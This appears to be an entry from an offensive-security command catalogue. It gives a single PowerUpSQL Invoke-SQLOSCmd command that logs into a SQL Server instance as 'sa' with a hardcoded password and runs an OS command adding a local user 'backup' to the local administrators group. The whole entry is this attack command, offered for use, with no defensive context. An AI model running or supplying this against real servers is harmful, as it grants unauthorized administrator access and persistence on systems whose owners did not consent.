---
id: e619b186-6e52-4692-9839-85f9881e5122
name: Add local user backup to local administrators group
type: command
executor: bash
data: PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>"
  -Command "net localgroup administrators backup /add" -Verbose
output: null
created_at: '2023-04-06T03:56:20.234151+00:00'
updated_at: '2023-04-10T20:36:45.393785+00:00'
---

# Add local user backup to local administrators group

```bash
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
```


